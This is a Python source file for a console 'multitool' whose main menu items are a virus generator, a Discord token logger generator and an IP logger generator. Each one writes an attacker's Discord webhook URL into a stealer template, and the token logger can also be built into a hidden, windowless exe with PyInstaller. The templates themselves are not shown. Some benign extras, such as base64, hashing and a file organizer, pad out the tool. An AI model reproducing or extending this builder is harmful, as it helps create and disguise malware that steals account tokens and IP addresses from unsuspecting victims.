import os
import sys
import re
import subprocess
import shutil
import requests
import base64
import hashlib
from typing import Optional
from colorama import Fore, Style, init

init(autoreset=True)

TEMPLATE_FILE = "template.py"
VIRUS_TEMP = "virus.py"
VIRUS_OUTPUT = "virusDONTOPEN.py"
OUTPUT_FILE = "iplogger.py"
TOKEN_TEMP = "tokenloggertemp.py"
TOKEN_OUTPUT = "tokenloggerDONTOPEN.py"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    print(f"""{Fore.BLUE}
  _   _      _                   __  __       _ _   _   _______          _ 

 | \ | |    (_)                 |  \/  |     | | | (_) |__   __|        | |
 |  \| |_  ___ _   _ _ __ ___   | \  / |_   _| | |_ _     | | ___   ___ | |
 | . ` \ \/ / | | | | '_ ` _ \  | |\/| | | | | | __| |    | |/ _ \ / _ \| |
 | |\  |>  <| | |_| | | | | | | | |  | | |_| | | |_| |    | | (_) | (_) | |
 |_| \_/_/\_\_|\__,_|_| |_| |_| |_|  |_|\__,_|_|\__|_|    |_|\___/ \___/|_|
    """)

def _run(cmd, cwd=None):
    return subprocess.run(cmd, cwd=cwd, check=False, capture_output=True, text=True)

def ensure_pyinstaller():
    if shutil.which("pyinstaller"):
        return True

    probe = _run([sys.executable, "-m", "PyInstaller", "--version"])
    if probe.returncode == 0:
        return True

    print("PyInstaller not found. It is required to build an exe.")
    choice = input("Install PyInstaller now using pip? [Y/n]: ").strip().lower()
    if choice in ("", "y", "yes"):
        print("Installing PyInstaller...")
        _run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
        install = _run([sys.executable, "-m", "pip", "install", "pyinstaller"]) 
        if install.returncode == 0:
            print("PyInstaller installed successfully.")
            return True
        else:
            print("Failed to install PyInstaller. stderr:\n" + (install.stderr or ""))
            return False
    else:
        print("Cannot build exe without PyInstaller.")
        return False

def build_exe(script_path: str) -> Optional[str]:
    if not ensure_pyinstaller():
        return None

    script_abs = os.path.abspath(script_path)
    base = os.path.splitext(os.path.basename(script_abs))[0]

    print("Building exe, this may take a moment...")
    proc = _run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", script_abs], cwd=os.path.dirname(script_abs))

    if proc.returncode != 0:
        print("PyInstaller failed. stdout:\n" + (proc.stdout or ""))
        print("stderr:\n" + (proc.stderr or ""))
        return None

    dist_dir = os.path.join(os.path.dirname(script_abs), "dist")
    built_exe = os.path.join(dist_dir, f"{base}.exe")

    if not os.path.exists(built_exe):
        print("Build completed but the expected exe was not found:", built_exe)
        return None

    final_exe = os.path.abspath(os.path.join(os.path.dirname(script_abs), f"{base}.exe"))

    try:
        if os.path.exists(final_exe):
            os.remove(final_exe)
        shutil.copy2(built_exe, final_exe)
    except Exception as e:
        print("Failed to place exe in project root:", e)
        print("You can find the executable in:", built_exe)
        return built_exe

    spec_file = os.path.join(os.path.dirname(script_abs), f"{base}.spec")
    build_dir = os.path.join(os.path.dirname(script_abs), "build")
    try:
        if os.path.exists(spec_file):
            os.remove(spec_file)
        if os.path.isdir(build_dir):
            shutil.rmtree(build_dir, ignore_errors=True)
    except Exception:
        pass

    return final_exe

def virus_generator():
    print("Virus Generator")
    if not os.path.exists(VIRUS_TEMP):
        print(f"Template file '{VIRUS_TEMP}' not found.")
        return

    user_value = input("whats the discord webhook?: ").strip()

    with open(VIRUS_TEMP, "r", encoding="utf-8") as f:
        content = f.read()

    pattern = r'WEBHOOK_URL\s*=\s*".*?"'
    replacement = f'WEBHOOK_URL = "{user_value}"'
    new_content = re.sub(pattern, replacement, content)

    token_value = input("whats the token?: ").strip()
    token_pattern = r'TOKEN\s*=\s*".*?"'
    token_replacement = f'TOKEN = "{token_value}"'
    token_new_content = re.sub(token_pattern, token_replacement, new_content)

    with open(VIRUS_OUTPUT, "w", encoding="utf-8") as f:
        f.write(token_new_content)

    print(f"Virus file created at: {VIRUS_OUTPUT}")

def token_generator():
    print("Token Logger Generator")
    if not os.path.exists(TOKEN_TEMP):
        print(f"Template file '{TOKEN_TEMP}' not found.")
        return

    user_value = input("whats the discord webhook?: ").strip()

    with open(TOKEN_TEMP, "r", encoding="utf-8") as f:
        content = f.read()

    pattern = r'WEBHOOK_URL\s*=\s*".*?"'
    replacement = f'WEBHOOK_URL = "{user_value}"'
    new_content = re.sub(pattern, replacement, content)

    with open(TOKEN_OUTPUT, "w", encoding="utf-8") as f:
        f.write(new_content)

    print(f"Token logger file created at: {TOKEN_OUTPUT}")
    while True:
        out_choice = input("Output format? [py/exe]: ").strip().lower()
        if out_choice in ("py", "exe"):
            break
        print("Please enter 'py' or 'exe'.")

    if out_choice == "py":
        print(f"\nPython file successfully created at:\n{TOKEN_OUTPUT}\n")
        return

    token_exe_path = build_exe(TOKEN_OUTPUT)
    if token_exe_path:
        print(f"\nExecutable successfully created at:\n{token_exe_path}\n")
    else:
        print("Failed to create executable. The Python file is still available at:", TOKEN_OUTPUT)

def file_generation():
    if not os.path.exists(TEMPLATE_FILE):
        print(f"Template file '{TEMPLATE_FILE}' not found.")
        return

    user_value = input("whats the discord webhook?: ").strip()

    with open(TEMPLATE_FILE, "r", encoding="utf-8") as f:
        content = f.read()

    pattern = r'WEBHOOK_URL\s*=\s*".*?"'
    replacement = f'WEBHOOK_URL = "{user_value}"'
    new_content = re.sub(pattern, replacement, content)

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write(new_content)

def ip_lookup():
    print(f"\n{Fore.BLUE}[*] Fetching Public IP Data...")
    try:
        data = requests.get("http://ip-api.com").json()
        print(f"IP: {data.get('query')}\nISP: {data.get('isp')}\nLocation: {data.get('city')}, {data.get('country')}")
    except:
        print(f"{Fore.RED}[!] Connection Error")
    input("\nPress Enter to return...")

def b64_tool():
    mode = input("\n1. Encode | 2. Decode: ")
    text = input("Enter String: ")
    try:
        if mode == "1":
            print("Result:", base64.b64encode(text.encode()).decode())
        else:
            print("Result:", base64.b64decode(text.encode()).decode())
    except:
        print(f"{Fore.RED}[!] Invalid Input")
    input("\nPress Enter...")

def webhook_sender():
    url = input("\nWebhook URL: ")
    msg = input("Message: ")
    try:
        requests.post(url, json={"content": msg})
        print(f"{Fore.GREEN}[+] Sent!")
    except:
        print(f"{Fore.RED}[!] Failed to send.")
    input("\nPress Enter...")

def hash_check():
    text = input("\nString to Hash (SHA256): ")
    result = hashlib.sha256(text.encode()).hexdigest()
    print(f"Hash: {Fore.GREEN}{result}")
    input("\nPress Enter...")

def organize_files():
    print(f"\n{Fore.BLUE}[*] File Organizer Active")
    path = input(f"Enter path to organize: {Fore.CYAN}").strip('"').strip()
    if not os.path.exists(path):
        print(f"{Fore.RED}[!] Path not found.")
        input("\nPress Enter...")
        return
    count = 0
    for filename in os.listdir(path):
        file_path = os.path.join(path, filename)
        if os.path.isdir(file_path): continue
        name, ext = os.path.splitext(filename)
        if not ext: ext = ".no_extension"
        subdir_name = f"{ext[1:].upper()} Files"
        subdir_path = os.path.join(path, subdir_name)
        try:
            if not os.path.exists(subdir_path): os.makedirs(subdir_path)
            shutil.move(file_path, os.path.join(subdir_path, filename))
            count += 1
        except: continue
    print(f"\n{Fore.BLUE}[*] Sorted {count} files.")
    input("\nPress Enter...")

def main():
    current_page = 1
    while True:
        clear()
        banner()
        print(f"{Fore.BLUE}         ==== Nxium Python Multitool ====")
        print(f"{Fore.WHITE}────────────────────────────────────────────────────────────")
        if current_page == 1:
            print(f"{Fore.WHITE} [1] Virus Gen         [4] IP Lookup")
            print(f"{Fore.WHITE} [2] Token Logger      [5] Base64 Tool")
            print(f"{Fore.WHITE} [3] IP Logger Gen     [9] Next Page")
        else:
            print(f"{Fore.WHITE} [6] Webhook Sender    [8] File Organizer")
            print(f"{Fore.WHITE} [7] SHA256 Hasher     [9] Previous Page")
            print(f"{Fore.WHITE}                       [0] Exit")
        print(f"{Fore.WHITE}────────────────────────────────────────────────────────────")
        
        choice = input(f"{Fore.CYAN}nxium@root:~$ {Style.RESET_ALL}").strip()

        if choice == "9":
            current_page = 2 if current_page == 1 else 1
            continue
        if choice == "0": break

        if current_page == 1:
            if choice == "1": virus_generator()
            elif choice == "2": token_generator()
            elif choice == "3": file_generation()
            elif choice == "4": ip_lookup()
            elif choice == "5": b64_tool()
        else:
            if choice == "6": webhook_sender()
            elif choice == "7": hash_check()
            elif choice == "8": organize_files()

if __name__ == "__main__":
    main()
